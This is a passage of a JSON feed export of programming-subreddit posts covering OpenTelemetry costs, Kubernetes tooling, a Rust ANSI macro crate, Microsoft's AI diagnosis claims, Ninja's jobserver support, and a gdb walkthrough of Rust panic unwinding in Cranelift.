\"myapp\",\n      \"service.instance.id\": \"10\",\n      \"host.name\": \"myserver\"\n      },\n   \"instrumentationLibrary\": {\n      \"name\": \"myapp\",\n      \"version\": \"1.0.0\"\n      },\n   \"severityText\": \"INFO\",\n &nbsp;&nbsp;\"timestamp\": \"2018-12-13T14:17:40.000Z\",\n &nbsp;&nbsp;\"body\": {\n      \"text\": \"HTTP request processed successfully\"\n     &nbsp;&nbsp;},\n&nbsp;&nbsp; \"attributes\": {\n      \"http_method\": \"GET\",\n      \"http_uri\": \"/example\",\n      \"http_version\": \"1.1\",\n      \"http_status\": \"200\",\n      \"client_addr\": \"127.0.0.1\",\n      \"http_user_agent\": \"my.service/1.0.0\"\n     &nbsp;&nbsp;}\n}</code></code></pre><p>That (generic, minimal) message weighs in at 420 bytes (without whitespace; it’s 520 bytes all-inclusive). It’s still tiny, but even so the OTel version with whitespace is 25% bigger than the JSON-ified message (with whitespace), and more than twice as large as the original log message.&nbsp;</p><p>Once we start applying real-world data, things balloon even more. My point here is this: If OTel does that to every log message, these tiny costs add up quickly.</p><p>It turns out that modern methods of metric management are just as susceptible to inflation.</p><ul><li>A typical prometheus metric, formatted in JSON, is 291 bytes.</li><li>But that same metric converted to OTLP metrics format weighs in at 751 bytes.</li></ul><p>It’s true, OTLP has a batching function that mitigates this, but that only helps with transfer over the wire. Once it arrives at the destination, many (not all, but most) vendors unbatch before storing, so it goes back to being 2.5x larger than the original message. As my buddy Josh Biggley has said,&nbsp;</p><blockquote><p><em>“2.5x metrics ingest better have a fucking amazing story to tell about context to justify that cost.”</em></p></blockquote><h2>It’s Not You, OTel, It’s Us. (But It’s Also You)</h2><p>If this all feels a little hyper-critical of OTel, then please give me a chance to explain. I honestly believe that OTel is an amazing advancement and anybody who’s serious about monitoring and observability needs to adopt it as a standard – that goes for users as well as vendors. The ability to emit the braid of logs, metrics, traces while maintaining its context, regardless of destination, is invaluable.</p><p>(But…) OTel was designed by (and for) software engineers. It originated in that bygone era (by which I mean “2016”) when we were still more concerned about the difficulty of getting the data than the cost of moving, processing, and storing it. OTel is, by design, biased to volume.</p><p>The joke of this section’s title notwithstanding, the problem really isn’t OTel. We really are at fault. Specifically our unhealthy relationship with telemetry. If we insist on collecting and transmitting every single data point, we have nobody to blame but ourselves for the sky-high bills we receive at the end of the month.</p><h2>Does This Data Bring You Joy?</h2><p>It’s easy to let your observability solution do the heavy lifting and shunt every byte of data into a unified interface. It’s easy to do if you’re a software engineer who (nominally at least) owns the monitoring and observability solutions.</p><p>It’s even easier if you’re a mere consumer of those services, an innocent bystander. Folks who fall into this category include those closely tied to a particular silo (database, storage, network, etc); or helpdesk and NOC teams who receive the tickets and provide support but aren’t involved in the instrumentation nor the tools the instrumentation is connected to; or teams with more specialized needs that nevertheless overlap with monitoring and observability, like information security.</p><p>But let’s be honest, if you’re a security engineer, how can you justify paying twice cost to ingest logs or metrics, versus the perfectly good standards that already exist and have served well for years? Does that mean you might be using more than one tool? Yes. But as I have pointed out (<a href=\"https://www.adatosystems.com/2023/06/21/how-to-overcome-data-silos-in-open-source-server-monitoring/\">time</a> and <a href=\"https://www.adatosystems.com/2021/11/01/four-ways-your-network-could-change-in-four-years/\">time</a> and <a href=\"https://www.adatosystems.com/2020/12/14/distributed-computing-when-everyone-is-working-from-home/\">time</a> and <a href=\"https://www.adatosystems.com/2019/08/13/icymi-why-do-we-put-up-with-monitoring-solutions-that-hurt-2/\">time</a> and <a href=\"https://www.adatosystems.com/2019/03/13/icymi-monitoring-and-automation-its-easier-than-you-think/\">time</a> and <a href=\"https://www.adatosystems.com/2019/03/06/icymi-the-cost-of-monitoring-with-the-wrong-tool/\">time</a> again) there is not (and never has been, and never will be) a one-size-fits-all solution. And in most situations there’s not even a one-size-fits-MOST solution. Monitoring and observability has always been about heterogeneous implementations. The sooner you embrace that ideal, the sooner you will begin building observability ecosystems that serve the needs of you, your team, and your business.</p><p>To that end there’s a serious ROI discussion to be had before you go all in on OTel or any observability solution.</p><p>We’ve seen the move from per seat (or interface, or chassis, or CPU) pricing to a consumption model in the marketplace in the past. And we’ve also seen technologies move back (like the way cell service moved from per-minute or per-text to unlimited data with a per-month charge). I suspect we may see a similar pendulum swing back with monitoring and observability at some time in the future. But for now, we have to contend with both the prevailing pricing system as it exists today; and with our own compulsion – born at a different point in the history of monitoring – to collect, transmit, and store every bit (and byte) of telemetry that passes beneath our nose.</p><p>Of course, cost isn’t the only factor. Performance, risk, (and more) need to be considered. But at the heart of it all is the very real need for us to start asking ourselves:</p><ul><li>What will I do with this data?</li><li>How long do I need to store it?</li></ul><p>And of course, <strong>Who the hell is going to pay for it?</strong></p>","contentLength":15063,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lo88h3/opentelemetry_is_great_but_who_the_hell_is_going/"},{"title":"I built a label-aware PostgreSQL proxy for Kubernetes – supports TLS, pooling, dynamic service discovery (feedback + contributors welcome!)","url":"https://www.reddit.com/r/kubernetes/comments/1lo81ev/i_built_a_labelaware_postgresql_proxy_for/","date":1751291434,"author":"/u/dewelopercloud","guid":176653,"unread":true,"content":"<p>I've been working on a Kubernetes-native PostgreSQL proxy written in Go, built from scratch with a focus on dynamic routing, TLS encryption, and full integration with K8s labels.</p><ul><li>TLS termination with auto-generated certificates (via cert-manager)</li><li>Dynamic service discovery via Kubernetes labels</li><li>Deployment-based routing (usernames like )</li><li>Optional connection pooling support (e.g. PgBouncer)</li><li>Works with any PostgreSQL deployment (single, pooled, cluster)</li><li>Super lightweight (uses ~0.1-0.5 vCPU / 18-60MB RAM under load)</li></ul><p>This is currently production-tested in my own hosting platform. I'd love your feedback — and if you're interested in contributing, the project could easily be extended to support MySQL or MongoDB next.</p><p>Looking forward to any ideas, improvements, or contributions 🙌</p>","contentLength":779,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Introducing Ansic; a blazing fast, proc macro - zero overhead way to style with ansi!","url":"https://www.reddit.com/r/rust/comments/1lo7q9e/introducing_ansic_a_blazing_fast_proc_macro_zero/","date":1751290629,"author":"/u/Pitiful-Run983","guid":178699,"unread":true,"content":"<p> the new crate solving the pain of building ansi styled applications with  and the magic of proc macros -- with 🚀  runtime overhead and  support</p><p>Most ansi crates uses  syntax for styling and display types and calculates the ansi style at runtime, which for applications with alot of styles or optimizations isn't ideal. Other crates also don't have a clean reusable model for ansi strings and alot of weird chaining and storing methods are used for it to be used.</p><p>Ansic solves those problems with a clean and reusable proc macro which uses a clean and convenient DSL which outputs raw string literals at compile time for  runtime overhead.</p><p>The  macro is the foundation of ansic, in here you write all your DSL expressions to define a style and it spits out the raw &amp;str literal.</p><p>Ansic has two different types of expressions separated by a space for each; Styles and colors.</p><p>Colors: Colors are simply written with their names (like \"green\" and \"red) but every single color supports extra arguments prefixed or postfixed by writing the format:  where each argument is with a dot before the color. There are two arguments for colors:</p><ul></ul><p>(by default if you dont provide the bg argument to a color its treated as a foreground color)</p><p>so let's say you want to make a ansi style which is a bright red foreground, then you can write , and it will output the string literal for the ansi equivalent, and if you want a bright red foreground with a bright green background you can do <code>ansi!(br.red bg.br.green)</code>. We also support 24bit rgb with the color syntax .</p><p>We also have styles (they don't take arguments) with for example the  and  styles with <code>ansi!(br.red underline bg.green bold)</code> for example (bright red foreground underline green background and bold ansi).</p><p>Ansic also encourages a consistent and reusable and simple architecture for styling with const:</p><pre><code>use ansic::ansi; const ERROR: &amp;'static str = ansi!(red bold underline); const R: &amp;'static str = ansi!(reset); fn main() { println!(\"{ERROR}ERROR: something wrong happened!{R}\"); } </code></pre><p>This encourages a reuseable, elegant and very easy way to style which muss less overhead (contradicting other crates with much less readable and elegant styles of styling)</p><p>🛠️ I built  because I was frustrated with other ansi crates:</p><p>It was hard to read, reuse and manage weirdly chained styles, and I hated that every time I used it there was a runtime calculation to make the styles even work. I love  because it solves all those problems with a clean reuseable model, DSL which is easy to read and maintain, and a proc macro which does everything at compile time.</p><p>I'm also 100% open to feedback, reviews, discussions and criticism!</p><p>🎨 Add ansic to style with ansi with !</p><p>🌟 If you like the project, please consider leaving a star on our <a href=\"https://github.com/zeonzip/ansic\">GitHub page</a>!</p>","contentLength":2772,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Microsoft Says Its New AI System Diagnosed Patients 4 Times More Accurately Than Human Doctors","url":"https://www.wired.com/story/microsoft-medical-superintelligence-diagnosis/","date":1751290307,"author":"/u/wiredmagazine","guid":176657,"unread":true,"content":"<p> “a genuine step toward medical superintelligence,” says Mustafa Suleyman, CEO of the company’s <a href=\"https://www.wired.com/tag/artificial-intelligence/\">artificial intelligence</a> arm. The tech giant says its powerful new AI tool can <a href=\"https://www.wired.com/story/ai-diagnose-illnesses-country-rich/\">diagnose disease</a> four times more accurately and at significantly less cost than a panel of human physicians.</p><p>The experiment tested whether the tool could correctly diagnose a patient with an ailment, mimicking work typically done by a human doctor.</p><p>The Microsoft team used 304 case studies sourced from the New England Journal of Medicine to devise a test called the Sequential Diagnosis Benchmark. A language model broke down each case into a step-by-step process that a doctor would perform in order to reach a diagnosis.</p><p>Microsoft’s researchers then built a system called the MAI Diagnostic Orchestrator (MAI-DxO) that queries several leading AI models—including OpenAI’s GPT, Google’s Gemini, Anthropic’s Claude, Meta’s Llama, and xAI’s Grok—in a way that loosely mimics several human experts working together.</p><p>In their experiment, MAI-DxO outperformed human doctors, achieving an accuracy of 80 percent compared to the doctors’ 20 percent. It also reduced costs by 20 percent by selecting less expensive tests and procedures.</p><p>\"This orchestration mechanism—multiple agents that work together in this chain-of-debate style—that's what's going to drive us closer to medical superintelligence,” Suleyman says.</p><p>The company poached several Google AI researchers to help with the effort—yet another sign of <a href=\"https://www.wired.com/story/four-openai-researchers-leave-meta/\">an intensifying war for top AI expertise</a> in the tech industry. Suleyman was previously an executive at Google working on AI.</p><p>AI is already widely used in some parts of the US health care industry, including helping radiologists interpret scans. The latest multimodal AI models have the potential to act as more general diagnostic tools, though the use of AI in health care raises its own issues, particularly related to bias from training data that’s skewed toward particular demographics.</p><p>Microsoft has not yet decided if it will try to commercialize the technology, but the same executive, who spoke on the condition of anonymity, said the company could integrate it into Bing to help users diagnose ailments. The company could also develop tools to help medical experts improve or even automate patient care. “What you'll see over the next couple of years is us doing more and more work proving these systems out in the real world,” Suleyman says.</p><p>The project is the latest in a growing body of research showing how AI models can diagnose disease. In the last few years, both Microsoft and Google have published papers showing that large language models can accurately diagnose an ailment when given access to medical records.</p><p>The new Microsoft research differs from previous work in that it more accurately replicates the way human physicians diagnose disease—by analyzing symptoms, ordering tests, and performing further analysis until a diagnosis is reached. Microsoft describes the way that it combined several frontier AI models as “a path to medical superintelligence” in a blog post about the project today.</p><p>The project also suggests that AI could help lower health care costs, a critical issue, particularly in the US. \"Our model performs incredibly well, both getting to the diagnosis and getting to that diagnosis very cost effectively,\" says Dominic King, a vice president at Microsoft who is involved with the project.</p>","contentLength":3445,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lo7lv8/microsoft_says_its_new_ai_system_diagnosed/"},{"title":"Changing max pods limit in already established cluster - Microk8s","url":"https://www.reddit.com/r/kubernetes/comments/1lo7cxk/changing_max_pods_limit_in_already_established/","date":1751289647,"author":"/u/BunkerFrog","guid":176744,"unread":true,"content":"<p>Hi, I do have quite beefy setup. Cluster of 4x 32core/64thread with 512GB RAM. Nodes are bare metal. I used stock setup with stock config of microk8s and while there was no problem I had reached limit of 110 pods/node. There are still plenty of system resources to utilize - for now using like 30% of CPU and RAM / node.</p><p>Question #1: Can I change limit on already running cluster? (there are some posts on internet that this change can only be done during cluster/node setup and can't be changed later)</p><p>Question #2: If it is possible to change it on already established cluster, will it be possible to change it via \"master\" or need to be changed manually on each node</p><p>Question #3: What real max should I use to not make my life with networking harder? (honestly I would be happy if 200 would pass)</p>","contentLength":795,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"rust-analyzer changelog #292","url":"https://rust-analyzer.github.io/thisweek/2025/06/30/changelog-292.html","date":1751289477,"author":"/u/WellMakeItSomehow","guid":176986,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lo7ap3/rustanalyzer_changelog_292/"},{"title":"Here is My 3D Pool Simulator for Linux","url":"https://github.com/sysrpl/Raylib.4.0.Pascal/blob/master/examples/table/README.md","date":1751286276,"author":"/u/sysrpl","guid":176659,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lo65wi/here_is_my_3d_pool_simulator_for_linux/"},{"title":"I'm getting an error after certificate renewal please help","url":"https://www.reddit.com/r/kubernetes/comments/1lo509h/im_getting_an_error_after_certificate_renewal/","date":1751282635,"author":"/u/Known_Wallaby_1821","guid":176568,"unread":true,"content":"<p>Hello, My Kubernetes cluster was running smoothly until I tried to renew the certificates after they expired. I ran the following commands:</p><blockquote><p>sudo kubeadm certs renew all</p><p>echo 'export KUBECONFIG=/etc/kubernetes/admin.conf' &gt;&gt; ~/.bashrc</p></blockquote><p>After that, some abnormalities started to appear in my cluster. Calico is completely down and even after deleting and reinstalling it, it does not come back up at all.</p><p>When I check the daemonsets and deployments in the kube-system namespace, I see:</p><blockquote><p>kubectl get daemonset -n kube-system</p><p>NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE</p><p>kubectl get deployments -n kube-system</p><p>NAME READY UP-TO-DATE AVAILABLE AGE</p><p>calico-kube-controllers 0/1 0 0 4m19s</p></blockquote><p>Before this, I was also getting \"unauthorized\" errors in the kubelet logs, which started after renewing the certificates. This is definitely abnormal because the pods created from deployments are not coming up and remain stuck.</p><p>There is no error message shown during deployment either. Please help.</p>","contentLength":986,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"After nine years, Ninja has merged support for the GNU Make jobserver","url":"https://thebrokenrail.com/2025/06/30/ninja-jobserver.html","date":1751281215,"author":"/u/TheBrokenRail-Dev","guid":176654,"unread":true,"content":"<p>And I promise you: this is awesome!</p><p><a href=\"https://ninja-build.org/\">Ninja</a> is a build system like <a href=\"https://www.gnu.org/software/make/\">GNU Make</a>: you give it the list of files you want created (the outputs), how it should create them (the rules), and what each one’s dependencies are (the inputs). But you need to ensure it creates files in parallel when possible. It must not re-create files that already exist, but must re-create files when inputs change. Many other tiny annoying details need to be handled as well.</p><p>Let’s focus on one specific detail: parallelism. Almost all build systems run in parallel to maximize resource utilization and minimize execution time. Ninja specifically defaults to running one process per CPU thread. This works great most of the time!</p><p>Except… what if one of those processes is another instance of Ninja? Now in the worst-case scenario (assuming an 8-core/16-thread CPU), you have the parent instance of Ninja managing 16 processes and another child instance managing 16 more threads! That adds up to 32 processes total on an eight-core CPU. You can see how this can quickly get out of hand and lead to massive resource over-utilization and even system freezes.</p><p>There are ways to work around this. For instance, you can disable parallelism on the child Ninja instance(s), but while that will fix over-utilization, it will lead to resource under-utilization and slower execution times. You can also try manually tweaking parallelism levels. However, that will cause inconsistent and inefficient behavior when using multiple build machines.</p><p>And this is a real problem affecting real projects. Features like <a href=\"https://cmake.org/cmake/help/latest/module/ExternalProject.html\">CMake’s </a> often lead to recursive Ninja calls. These recursive calls can easily cause the parallelism problem described above. For reference, see <a href=\"https://groups.google.com/g/ninja-build/c/AAuTlZp57f0\">these</a><a href=\"https://discourse.cmake.org/t/efficiency-issues-with-externalproject-sub-builds-under-ninja/3241\">discussion</a><a href=\"https://gitlab.kitware.com/cmake/cmake/-/issues/21597#note_1208049\">posts</a>.</p><p>But what if I told you this problem has already been solved… back in <a href=\"https://cgit.git.savannah.gnu.org/cgit/make.git/commit/?id=fc0fe4103ac983d88b83dad0daf97664ffa8e04b\">1999</a>?</p><h2>Introducing: The GNU Make Jobserver</h2><p>This was created because GNU Make experienced the same problem as Ninja: recursive GNU Make calls could easily cause resource over-utilization and system freezes. Previously, this had been “solved” by disabling parallelism in child GNU Make calls, but as I mentioned earlier, this led to resource under-utilization and longer build times.</p><p>The jobserver was a proper solution. The parent GNU Make instance would act as the server. All child instances would be clients. Anytime a client wanted to launch a process, it would ask the server to tell it when it was allowed to. This allowed the server to ensure resources were not over- or under-utilized.</p><p>So, if GNU Make had this problem solved for such a long time, why did people experiencing it keep using Ninja? Well, unfortunately many tools like <a href=\"https://mesonbuild.com/\">Meson</a> did not support GNU Make. This meant developers still needed Ninja.</p><p>Over the years, this has led to a few soft forks of Ninja where the sole change was merging jobserver support (including <a href=\"https://github.com/Kitware/ninja\">one</a> from <a href=\"https://www.kitware.com/\">Kitware</a>, the company behind CMake).</p><p>Thankfully, as of this blog post, Ninja now supports the exact same tried-and-tested jobserver protocol. That means the problem is completely solved, right? …Right?</p><p>As you might have guessed, there are multiple catches.</p><p>For one, Ninja only implements support for the jobserver . Without a corresponding server, it cannot actually do anything. This means you either need to run your Ninja instance inside an instance of GNU Make or <a href=\"https://github.com/ninja-build/ninja/blob/656412538b6fc102b809a61e0efce422e5a20534/misc/jobserver_pool.py\">some other server implementation</a>.</p><p>Another issue is that on Linux it only supports the <a href=\"https://www.gnu.org/software/make/manual/html_node/POSIX-Jobserver.html\">named pipe/FIFO implementation</a> of the jobserver. This was released with <a href=\"https://lists.gnu.org/archive/html/help-make/2022-10/msg00020.html\">GNU Make 4.4</a> back in October 2022, which was only added to <a href=\"https://wiki.debian.org/DebianTrixie\">Debian Trixie</a> just a few months ago, in <a href=\"https://metadata.ftp-master.debian.org/changelogs//main/m/make-dfsg/make-dfsg_4.4.1-2_changelog\">December 2024</a>. This means you will need an extremely recent OS. Otherwise, GNU Make’s jobserver will not be compatible with Ninja.</p><p>And finally, as of writing this post, <a href=\"https://github.com/ninja-build/ninja/releases/tag/v1.13.0\">Ninja v1.13.0</a> (the version containing jobserver support) is less than a week-old. It will take a while before it is included in major package repositories. Until then, you will probably have to compile it from source code or use third-party binaries.</p><p>While I might have been nitpicky, this is a major improvement. This will give many Ninja-based projects an immediate performance improvement with minimal required changes. I certainly cannot complain too much about that.</p>","contentLength":4215,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lo4krm/after_nine_years_ninja_has_merged_support_for_the/"},{"title":"After nine years, Ninja has merged support for the GNU Make jobserver","url":"https://thebrokenrail.com/2025/06/30/ninja-jobserver.html","date":1751281187,"author":"/u/TheBrokenRail-Dev","guid":176605,"unread":true,"content":"<p>And I promise you: this is awesome!</p><p><a href=\"https://ninja-build.org/\">Ninja</a> is a build system like <a href=\"https://www.gnu.org/software/make/\">GNU Make</a>: you give it the list of files you want created (the outputs), how it should create them (the rules), and what each one’s dependencies are (the inputs). But you need to ensure it creates files in parallel when possible. It must not re-create files that already exist, but must re-create files when inputs change. Many other tiny annoying details need to be handled as well.</p><p>Let’s focus on one specific detail: parallelism. Almost all build systems run in parallel to maximize resource utilization and minimize execution time. Ninja specifically defaults to running one process per CPU thread. This works great most of the time!</p><p>Except… what if one of those processes is another instance of Ninja? Now in the worst-case scenario (assuming an 8-core/16-thread CPU), you have the parent instance of Ninja managing 16 processes and another child instance managing 16 more threads! That adds up to 32 processes total on an eight-core CPU. You can see how this can quickly get out of hand and lead to massive resource over-utilization and even system freezes.</p><p>There are ways to work around this. For instance, you can disable parallelism on the child Ninja instance(s), but while that will fix over-utilization, it will lead to resource under-utilization and slower execution times. You can also try manually tweaking parallelism levels. However, that will cause inconsistent and inefficient behavior when using multiple build machines.</p><p>And this is a real problem affecting real projects. Features like <a href=\"https://cmake.org/cmake/help/latest/module/ExternalProject.html\">CMake’s </a> often lead to recursive Ninja calls. These recursive calls can easily cause the parallelism problem described above. For reference, see <a href=\"https://groups.google.com/g/ninja-build/c/AAuTlZp57f0\">these</a><a href=\"https://discourse.cmake.org/t/efficiency-issues-with-externalproject-sub-builds-under-ninja/3241\">discussion</a><a href=\"https://gitlab.kitware.com/cmake/cmake/-/issues/21597#note_1208049\">posts</a>.</p><p>But what if I told you this problem has already been solved… back in <a href=\"https://cgit.git.savannah.gnu.org/cgit/make.git/commit/?id=fc0fe4103ac983d88b83dad0daf97664ffa8e04b\">1999</a>?</p><h2>Introducing: The GNU Make Jobserver</h2><p>This was created because GNU Make experienced the same problem as Ninja: recursive GNU Make calls could easily cause resource over-utilization and system freezes. Previously, this had been “solved” by disabling parallelism in child GNU Make calls, but as I mentioned earlier, this led to resource under-utilization and longer build times.</p><p>The jobserver was a proper solution. The parent GNU Make instance would act as the server. All child instances would be clients. Anytime a client wanted to launch a process, it would ask the server to tell it when it was allowed to. This allowed the server to ensure resources were not over- or under-utilized.</p><p>So, if GNU Make had this problem solved for such a long time, why did people experiencing it keep using Ninja? Well, unfortunately many tools like <a href=\"https://mesonbuild.com/\">Meson</a> did not support GNU Make. This meant developers still needed Ninja.</p><p>Over the years, this has led to a few soft forks of Ninja where the sole change was merging jobserver support (including <a href=\"https://github.com/Kitware/ninja\">one</a> from <a href=\"https://www.kitware.com/\">Kitware</a>, the company behind CMake).</p><p>Thankfully, as of this blog post, Ninja now supports the exact same tried-and-tested jobserver protocol. That means the problem is completely solved, right? …Right?</p><p>As you might have guessed, there are multiple catches.</p><p>For one, Ninja only implements support for the jobserver . Without a corresponding server, it cannot actually do anything. This means you either need to run your Ninja instance inside an instance of GNU Make or <a href=\"https://github.com/ninja-build/ninja/blob/656412538b6fc102b809a61e0efce422e5a20534/misc/jobserver_pool.py\">some other server implementation</a>.</p><p>Another issue is that on Linux it only supports the <a href=\"https://www.gnu.org/software/make/manual/html_node/POSIX-Jobserver.html\">named pipe/FIFO implementation</a> of the jobserver. This was released with <a href=\"https://lists.gnu.org/archive/html/help-make/2022-10/msg00020.html\">GNU Make 4.4</a> back in October 2022, which was only added to <a href=\"https://wiki.debian.org/DebianTrixie\">Debian Trixie</a> just a few months ago, in <a href=\"https://metadata.ftp-master.debian.org/changelogs//main/m/make-dfsg/make-dfsg_4.4.1-2_changelog\">December 2024</a>. This means you will need an extremely recent OS. Otherwise, GNU Make’s jobserver will not be compatible with Ninja.</p><p>And finally, as of writing this post, <a href=\"https://github.com/ninja-build/ninja/releases/tag/v1.13.0\">Ninja v1.13.0</a> (the version containing jobserver support) is less than a week-old. It will take a while before it is included in major package repositories. Until then, you will probably have to compile it from source code or use third-party binaries.</p><p>While I might have been nitpicky, this is a major improvement. This will give many Ninja-based projects an immediate performance improvement with minimal required changes. I certainly cannot complain too much about that.</p>","contentLength":4215,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lo4kev/after_nine_years_ninja_has_merged_support_for_the/"},{"title":"Result in C++","url":"https://github.com/Jarsop/cpp_result","date":1751280470,"author":"/u/Jarsop","guid":176745,"unread":true,"content":"<p>Rust developer since more than 8 years ago, I really annoyed when I use other languages without  API. In C++ we have  (since c++17) and  (since c++23) but I don’t think it’s really convenient. This how I decided to create , a more ergonomic API which try to mimic Rust  type. Macros are also provided to mimic the  operator. Any feedback is very welcomed.</p>","contentLength":359,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lo4deu/result_in_c/"},{"title":"Bardcore Portfolio - Powered by Go","url":"https://www.reddit.com/r/golang/comments/1lo45qd/bardcore_portfolio_powered_by_go/","date":1751279692,"author":"/u/ArinjiBoi","guid":176658,"unread":true,"content":"<p>Hey Everyone! I just finished working on a portfolio site themed around \"bardcore\", its a site i made for my music friend to showcase her songs. I am using Pocketbase for the backend with a golang proxy to have the music stored in google drive be playable on the site</p>","contentLength":267,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The Evolution of Caching Libraries in Go","url":"https://maypok86.github.io/otter/blog/cache-evolution/","date":1751278826,"author":"/u/Ploobers","guid":176528,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1lo3x9k/the_evolution_of_caching_libraries_in_go/"},{"title":"Exception handling in rustc_codegen_cranelift","url":"https://tweedegolf.nl/en/blog/157/exception-handling-in-rustc-codegen-cranelift","date":1751278609,"author":"/u/Expurple","guid":176746,"unread":true,"content":"<p>We will use the following example to illustrate the various cases that commonly occur:</p><pre><code>// For do_catch\n#![feature(rustc_attrs, core_intrinsics)]\n#![allow(internal_features)]\nstruct Droppable;\nimpl Drop for Droppable {\n    fn drop(&amp;mut self) {}\n}\n// Unwind without running any drops\n#[no_mangle]\nfn do_panic() {\n    std::panic::panic_any(());\n}\n// Unwind while running a drop on the cleanup path\n#[no_mangle]\nfn some_func() {\n    let _a = Droppable;\n    do_panic();\n}\n// Catch a panic\n#[no_mangle]\nfn do_catch_panic() {\n    // This has a simplified version of std::panic::catch_unwind inlined for ease of understanding\n    unsafe {\n        if std::intrinsics::catch_unwind(do_call, 0 as *mut _, do_catch) == 0 {\n            std::process::abort(); // unreachable\n        } else {\n            // Caught panic\n        };\n    }\n    #[inline]\n    fn do_call(_data: *mut u8) {\n        some_func();\n    }\n    #[inline]\n    #[rustc_nounwind] // `intrinsic::catch_unwind` requires catch fn to be nounwind\n    fn do_catch(_data: *mut u8, _panic_payload: *mut u8) {}\n}\nfn main() {\n    do_catch_panic();\n}\n</code></pre><p>Let's first compile this using a version of  with unwinding enabled:</p><pre><code>dist/rustc-clif panic_example.rs -Cdebuginfo=2 --emit link,mir,llvm-ir\n</code></pre><p>This command enables debuginfo, and emits three artifacts:  emits the normal executable,  emits MIR, and  is repurposed with  to emit Cranelift IR (clif ir for short). In any case with the executable now compiled, let's run it in a debugger:</p><pre><code>$ gdb ./panic_example\nReading symbols from ./panic_example...\n</code></pre><p>We begin by setting a breakpoint in :</p><pre><code>(gdb) break do_panic\nBreakpoint 1 at 0x38794: file panic_example.rs, line 13.\n</code></pre><pre><code>(gdb) run\nDownloading separate debug info for system-supplied DSO at 0xfffff7ffb000\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/aarch64-linux-gnu/libthread_db.so.1\".\nBreakpoint 1, panic_example::do_panic () at panic_example.rs:13\n13          std::panic::panic_any(());\n(gdb) backtrace\n#0  panic_example::do_panic () at panic_example.rs:13\n#1  0x0000aaaaaaad87b4 in panic_example::some_func () at panic_example.rs:20\n#2  0x0000aaaaaaad8868 in panic_example::do_catch_panic::do_call () at panic_example.rs:37\n#3  0x0000aaaaaaad8820 in panic_example::do_catch_panic () at panic_example.rs:28\n#4  0x0000aaaaaaad888c in panic_example::main () at panic_example.rs:46\n[...]\n</code></pre><pre><code>(gdb) break _Unwind_RaiseException\nBreakpoint 2 at 0xfffff7f975e8: file ../../../src/libgcc/unwind.inc, line 93\n(gdb) continue\nContinuing.\nthread 'main' panicked at panic_example.rs:13:5:\nBox&lt;dyn Any&gt;\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\nBreakpoint 2, _Unwind_RaiseException (exc=0xaaaaaace1ce0) at ../../../src/libgcc/unwind.inc:93\nwarning: 93     ../../../src/libgcc/unwind.inc: No such file or directory\n(gdb) bt\n#0  _Unwind_RaiseException (exc=0xaaaaaace1ce0) at ../../../src/libgcc/unwind.inc:93\n#1  0x0000aaaaaabde42c in panic_unwind::imp::panic () at library/panic_unwind/src/gcc.rs:72\n#2  0x0000aaaaaabdde3c in panic_unwind::__rust_start_panic () at library/panic_unwind/src/lib.rs:103\n#3  0x0000aaaaaaae977c in std::panicking::rust_panic () at library/std/src/panicking.rs:894\n#4  0x0000aaaaaaae959c in std::panicking::rust_panic_with_hook () at library/std/src/panicking.rs:858\n#5  0x0000aaaaaaad7bcc in std::panicking::begin_panic::{closure#0}&lt;()&gt; () at /home/gh-bjorn3/cg_clif/build/stdlib/library/std/src/panicking.rs:770\n#6  0x0000aaaaaaad7b20 in std::sys::backtrace::__rust_end_short_backtrace&lt;std::panicking::begin_panic::{closure_env#0}&lt;()&gt;, !&gt; ()\n    at /home/gh-bjorn3/cg_clif/build/stdlib/library/std/src/sys/backtrace.rs:168\n#7  0x0000aaaaaaad7b70 in std::panicking::begin_panic&lt;()&gt; () at /home/gh-bjorn3/cg_clif/build/stdlib/library/std/src/panicking.rs:769\n#8  0x0000aaaaaaad7b4c in std::panic::panic_any&lt;()&gt; () at /home/gh-bjorn3/cg_clif/build/stdlib/library/std/src/panic.rs:260\n#9  0x0000aaaaaaad87a0 in panic_example::do_panic () at panic_example.rs:13\n#10 0x0000aaaaaaad87b4 in panic_example::some_func () at panic_example.rs:20\n#11 0x0000aaaaaaad8868 in panic_example::do_catch_panic::do_call () at panic_example.rs:37\n#12 0x0000aaaaaaad8820 in panic_example::do_catch_panic () at panic_example.rs:28\n#13 0x0000aaaaaaad888c in panic_example::main () at panic_example.rs:46\n[...]\n</code></pre><p>We can validate that the exception is in fact a Rust exception by running:</p><pre><code>(gdb) print exc\n$1 = (struct _Unwind_Exception *) 0xaaaaaace1ce0\n(gdb) print *exc\n$2 = {exception_class = 6076294132934528845, exception_cleanup = 0xaaaaaabde440 &lt;panic_unwind::imp::panic::exception_cleanup&gt;, private_1 = 0, private_2 = 0}\n(gdb) print (char[8])(exc.exception_class)\n$3 = \"MOZ\\000RUST\"\n</code></pre><p>That looks a lot like a Rust exception to me. The rest of the exception data is located directly after the  struct.</p><h2>Unwinding ABI crash course</h2><p>There are nowadays two major unwinder ABIs still in use for C++ exceptions and Rust panics. These are:</p><ul><li>SEH (Structured Exception Handling) on Windows</li><li>Itanium unwinding ABI (originating from the infamous Intel <a href=\"https://en.wikipedia.org/wiki/Itanium\">cpu architecture</a>) on most Unix 